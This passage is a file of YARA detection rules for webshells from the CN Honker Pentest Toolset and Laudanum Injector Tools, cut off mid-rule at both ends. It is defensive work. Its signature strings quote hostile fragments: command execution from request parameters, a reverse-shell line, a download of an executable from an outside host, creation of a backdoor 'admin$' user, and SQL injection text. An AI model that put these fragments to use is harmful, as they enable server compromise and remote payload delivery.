      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cook" ascii
      $s1 = "<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule CN_Honker_Webshell__php1_php7_php9_RID33F2 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:09:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "05a3f93dbb6c3705fd5151b6ffb64b53bc555575"
      hash2 = "cd3962b1dba9f1b389212e38857568b69ca76725"
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<a href=\"?s=h&o=wscript\">[WScript.shell]</a> " fullword ascii
      $s2 = "document.getElementById('cmd').value = Str[i];" fullword ascii
      $s3 = "Str[7] = \"copy c:\\\\\\\\1.php d:\\\\\\\\2.php\";" fullword ascii
   condition: 
      filesize < 300KB and all of them
}

rule CN_Honker_Webshell__Serv_U_by_Goldsun_asp3_Serv_U_asp_RID3BB0 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - from files Serv-U_by_Goldsun.asp, asp3.txt, Serv-U asp.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 20:39:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "87c5a76989bf08da5562e0b75c196dcb3087a27b"
      hash2 = "cee91cd462a459d31a95ac08fe80c70d2f9c1611"
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii
      $s2 = "loginpass = \"Pass \" & pass & vbCrLf" fullword ascii
      $s3 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCr" ascii
   condition: 
      filesize < 444KB and all of them
}

rule CN_Honker_Webshell__asp4_asp4_MSSQL__MSSQL__RID36A6 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - from files asp4.txt, asp4.txt, MSSQL_.asp, MSSQL_.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 17:04:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4005b83ced1c032dc657283341617c410bc007b8"
      hash2 = "7097c21f92306983add3b5b29a517204cd6cd819"
      hash3 = "7097c21f92306983add3b5b29a517204cd6cd819"
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\"<form name=\"\"searchfileform\"\" action=\"\"?action=searchfile\"\" method=\"" ascii
      $s1 = "\"<TD ALIGN=\"\"Left\"\" colspan=\"\"5\"\">[\"& DbName & \"]" fullword ascii
      $s2 = "Set Conn = Nothing " fullword ascii
   condition: 
      filesize < 341KB and all of them
}

rule CN_Honker_Webshell__Injection_jmCook_jmPost_ManualInjection_RID3E5C : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - from files Injection.exe, jmCook.asp, jmPost.asp, ManualInjection.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 22:33:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5e1851c77ce922e682333a3cb83b8506e1d7395d"
      hash2 = "f80ec26bbdc803786925e8e0450ad7146b2478ff"
      hash3 = "e83d427f44783088a84e9c231c6816c214434526"
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii
      $s2 = "strReturn=Replace(strReturn,chr(43),\"%2B\")  'JMDCW" fullword ascii
   condition: 
      filesize < 7342KB and all of them
}

rule CN_Honker_Webshell_cmfshell_RID31AA : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file cmfshell.cmf"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:32:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii
      $s2 = "<form action=\"<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>\" method=\"post\">" fullword ascii
   condition: 
      filesize < 4KB and all of them
}

rule CN_Honker_Webshell_PHP_php4_RID311F : CHINA DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php4.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "nc -l -vv -p port(" ascii
   condition: 
      uint16 ( 0 ) == 0x4850 and filesize < 1KB and all of them
}

rule CN_Honker_Webshell_Linux_2_6_Exploit_RID34D6 : CHINA DEMO EXPLOIT LINUX T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file 2.6.9"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:47:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, EXPLOIT, LINUX, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?" fullword ascii
   condition: 
      filesize < 56KB and all of them
}

rule CN_Honker_Webshell_ASP_asp2_RID3115 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp2.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
      $s2 = "webshell</font> <font color=#00FF00>" fullword ascii
      $s3 = "Userpwd = \"admin\"   'User Password" fullword ascii
   condition: 
      filesize < 10KB and all of them
}

rule CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH_RID3477 : CHINA DEMO T1021_004 T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file FTP MYSQL MSSQL SSH.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:31:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1021_004, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];" fullword ascii
      $s2 = "Codz by <a href=\"http://www.sablog.net/blog\">4ngel</a><br />" fullword ascii
      $s3 = "if ($conn_id = @ftp_connect($host, $ftpport)) {" fullword ascii
      $s4 = "$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];" fullword ascii
      $s5 = "<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>" fullword ascii
   condition: 
      filesize < 20KB and 3 of them
}

rule CN_Honker_Webshell_ASP_shell_RID31B7 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file shell.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:34:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "xPost.Open \"GET\",\"http://www.i0day.com/1.txt\",False //" fullword ascii
      $s2 = "sGet.SaveToFile Server.MapPath(\"test.asp\"),2 //" fullword ascii
      $s3 = "http://hi.baidu.com/xahacker/fuck.txt" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule CN_Honker_Webshell_PHP_php7_RID3122 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file php7.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:09:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }" ascii
      $s1 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = iss" ascii
   condition: 
      filesize < 300KB and all of them
}

rule CN_Honker_Webshell_ASP_rootkit_RID32AB : CHINA DEMO T1014 T1087_002 T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file rootkit.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:15:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1014, T1087_002, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "set ss=zsckm.get(\"Win32_ProcessSta\"&uyy&\"rtup\")" fullword ascii
      $s1 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii
   condition: 
      filesize < 80KB and all of them
}

rule CN_Honker_Webshell_jspshell_RID31C1 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file jspshell.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:36:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Proce" ascii
      $s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii
   condition: 
      filesize < 30KB and all of them
}

rule CN_Honker_Webshell_Serv_U_serv_u_RID33A3 : CHINA DEMO T1218_011 T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file serv-u.php"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 14:56:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-23"
      tags = "CHINA, DEMO, T1218_011, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "@readfile(\"c:\\\\winnt\\\\system32\\" ascii
      $s2 = "$sendbuf = \"PASS \".$_POST[\"password\"].\"\\r\\n\";" fullword ascii
      $s3 = "$cmd=\"cmd /c rundll32.exe $path,install $openPort $activeStr\";" fullword ascii
   condition: 
      filesize < 435KB and all of them
}

rule CN_Honker_Webshell_WebShell_RID3172 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file WebShell.cgi"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:22:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$login = crypt($WebShell::Configuration::password, $salt);" fullword ascii
      $s2 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword ascii
      $s3 = "warn \"command: '$command'\\n\";" fullword ascii
   condition: 
      filesize < 30KB and 2 of them
}

rule CN_Honker_Webshell_Tuoku_script_mssql_2_RID3688 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file mssql.asp"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 16:59:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "sqlpass=request(\"sqlpass\")" fullword ascii
      $s2 = "set file=fso.createtextfile(server.mappath(request(\"filename\")),8,true)" fullword ascii
      $s3 = "<blockquote> ServerIP:&nbsp;&nbsp;&nbsp;" fullword ascii
   condition: 
      filesize < 3KB and all of them
}

rule CN_Honker_Webshell_ASP_asp1_RID3114 : CHINA DEMO T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file asp1.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:07:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SItEuRl=" ascii
      $s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
      $s3 = "Server.ScriptTimeout=" ascii
   condition: 
      filesize < 200KB and all of them
}

rule CN_Honker_Webshell_RID2DFD : CHINA DEMO EXE FILE HKTL T1505_003 WEBSHELL {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file Webshell.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 10:55:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Windows NT users: Please note that having the WinIce/SoftIce" fullword ascii
      $s2 = "Do you want to cancel the file download?" fullword ascii
      $s3 = "Downloading: %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 381KB and all of them
}

rule CN_Honker_GetWebShell_RID2EFD : CHINA DEMO EXE FILE HKTL T1021_002 T1087_002 {
   meta:
      description = "Sample from CN Honker Pentest Toolset - file GetWebShell.exe"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 11:38:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1021_002, T1087_002"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo P.Open \"GET\",\"http://www.baidu.com/ma.exe\",0 >>run.vbs" fullword ascii
      $s5 = "http://127.0.0.1/sql.asp?id=1" fullword wide
      $s14 = "net user admin$ hack /add" fullword wide
      $s15 = ";Drop table [hack];create table [dbo].[hack] ([cmd] [image])--" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and 1 of them
}

rule Webshell_XML_WEB_INF_web_RID2FAD : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file web.xml"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 12:07:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<servlet-name>Command</servlet-name>" fullword ascii
      $s2 = "<jsp-file>/cmd.jsp</jsp-file>" fullword ascii
   condition: 
      filesize < 1KB and all of them
}

rule Webshell_asp_file_RID2DE9 : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file file.asp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:52:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "' *** Written by Tim Medin <tim@counterhack.com>" fullword ascii
      $s2 = "Response.BinaryWrite(stream.Read)" fullword ascii
      $s3 = "Response.Write(Response.Status & Request.ServerVariables(\"REMOTE_ADDR\"))" fullword ascii
      $s4 = "%><a href=\"<%=Request.ServerVariables(\"URL\")%>\">web root</a><br/><%" fullword ascii
      $s5 = "set folder = fso.GetFolder(path)" fullword ascii
      $s6 = "Set file = fso.GetFile(filepath)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 30KB and 5 of them
}

rule Webshell_php_killnc_RID2ECA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file killnc.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii
      $s2 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
      $s3 = "<?php echo exec('killall nc');?>" fullword ascii
      $s4 = "<title>Laudanum Kill nc</title>" fullword ascii
      $s5 = "foreach ($allowedIPs as $IP) {" fullword ascii
   condition: 
      filesize < 15KB and 4 of them
}

rule Webshell_asp_shell_2_RID2EF2 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file shell.asp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:36:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<form action=\"shell.asp\" method=\"POST\" name=\"shell\">" fullword ascii
      $s2 = "%ComSpec% /c dir" fullword ascii
      $s3 = "Set objCmd = wShell.Exec(cmd)" fullword ascii
      $s4 = "Server.ScriptTimeout = 180" fullword ascii
      $s5 = "cmd = Request.Form(\"cmd\")" fullword ascii
      $s6 = "' ***  http://laudanum.secureideas.net" fullword ascii
      $s7 = "Dim wshell, intReturn, strPResult" fullword ascii
   condition: 
      filesize < 15KB and 4 of them
}

rule Webshell_settings_PHP_RID2F5E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file settings.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:54:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Port: <input name=\"port\" type=\"text\" value=\"8888\">" fullword ascii
      $s2 = "<li>Reverse Shell - " fullword ascii
      $s3 = "<li><a href=\"<?php echo plugins_url('file.php', __FILE__);?>\">File Browser</a>" ascii
   condition: 
      filesize < 13KB and all of them
}

rule Webshell_asp_proxy_RID2E8B : DEMO T1090 T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file proxy.asp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:19:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1090, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "'response.write \"<br/>  -value:\" & request.querystring(key)(j)" fullword ascii
      $s2 = "q = q & \"&\" & key & \"=\" & request.querystring(key)(j)" fullword ascii
      $s3 = "for each i in Split(http.getAllResponseHeaders, vbLf)" fullword ascii
      $s4 = "'urlquery = mid(urltemp, instr(urltemp, \"?\") + 1)" fullword ascii
      $s5 = "s = urlscheme & urlhost & urlport & urlpath" fullword ascii
      $s6 = "Set http = Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii
   condition: 
      filesize < 50KB and all of them
}

rule Webshell_cfm_shell_RID2E53 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file shell.cfm"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Executable: <Input type=\"text\" name=\"cmd\" value=\"cmd.exe\"><br>" fullword ascii
      $s2 = "<cfif ( #suppliedCode# neq secretCode )>" fullword ascii
      $s3 = "<cfif IsDefined(\"form.cmd\")>" fullword ascii
   condition: 
      filesize < 20KB and 2 of them
}

rule Webshell_aspx_shell_RID2ED9 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file shell.aspx"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:32:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "remoteIp = HttpContext.Current.Request.Headers[\"X-Forwarded-For\"].Split(new" ascii
      $s2 = "remoteIp = Request.UserHostAddress;" fullword ascii
      $s3 = "<form method=\"post\" name=\"shell\">" fullword ascii
      $s4 = "<body onload=\"document.shell.c.focus()\">" fullword ascii
   condition: 
      filesize < 20KB and all of them
}

rule Webshell_php_shell_RID2E65 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file shell.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:12:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "command_hist[current_line] = document.shell.command.value;" fullword ascii
      $s2 = "if (e.keyCode == 38 && current_line < command_hist.length-1) {" fullword ascii
      $s3 = "array_unshift($_SESSION['history'], $command);" fullword ascii
      $s4 = "if (preg_match('/^[[:blank:]]*cd[[:blank:]]*$/', $command)) {" fullword ascii
   condition: 
      filesize < 40KB and all of them
}

rule Webshell_php_reverse_shell_RID31C0 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file php-reverse-shell.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 13:35:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
      $s2 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii
      $s3 = "$input = fread($pipes[1], $chunk_size);" fullword ascii
   condition: 
      filesize < 15KB and all of them
}

rule Webshell_php_dns_RID2D92 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file dns.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:37:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$query = isset($_POST['query']) ? $_POST['query'] : '';" fullword ascii
      $s2 = "$result = dns_get_record($query, $types[$type], $authns, $addtl);" fullword ascii
      $s3 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii
      $s4 = "foreach (array_keys($types) as $t) {" fullword ascii
   condition: 
      filesize < 15KB and all of them
}

rule Webshell_jsp_cmd_2_RID2E17 : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file cmd.war"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:59:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "cmd.jsp}" fullword ascii
      $s1 = "cmd.jspPK" fullword ascii
      $s2 = "WEB-INF/web.xml" fullword ascii
      $s3 = "WEB-INF/web.xmlPK" fullword ascii
      $s4 = "META-INF/MANIFEST.MF" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 2KB and all of them
}

rule Webshell_laudanum_RID2DFD : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file laudanum.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:55:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "public function __activate()" fullword ascii
      $s2 = "register_activation_hook(__FILE__, array('WP_Laudanum', 'activate'));" fullword ascii
   condition: 
      filesize < 5KB and all of them
}

rule Webshell_php_file_RID2DED : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file file.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:52:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$allowedIPs =" fullword ascii
      $s2 = "<a href=\"<?php echo $_SERVER['PHP_SELF']  ?>\">Home</a><br/>" fullword ascii
      $s3 = "$dir  = isset($_GET[\"dir\"])  ? $_GET[\"dir\"]  : \".\";" fullword ascii
      $s4 = "$curdir .= substr($curdir, -1) != \"/\" ? \"/\" : \"\";" fullword ascii
   condition: 
      filesize < 10KB and all of them
}

rule Webshell_warfiles_cmd_RID2F96 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file cmd.jsp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 12:03:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));" fullword ascii
      $s2 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword ascii
      $s3 = "<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">" fullword ascii
      $s4 = "String disr = dis.readLine();" fullword ascii
   condition: 
      filesize < 2KB and all of them
}

rule Webshell_asp_dns_RID2D8E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file dns.asp"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:36:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "command = \"nslookup -type=\" & qtype & \" \" & query " fullword ascii
      $s2 = "Set objCmd = objWShell.Exec(command)" fullword ascii
      $s3 = "Response.Write command & \"<br>\"" fullword ascii
      $s4 = "<form name=\"dns\" method=\"POST\">" fullword ascii
   condition: 
      filesize < 21KB and all of them
}

rule php_reverse_shell_2_RID2EBC : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file php-reverse-shell.php"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 11:27:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
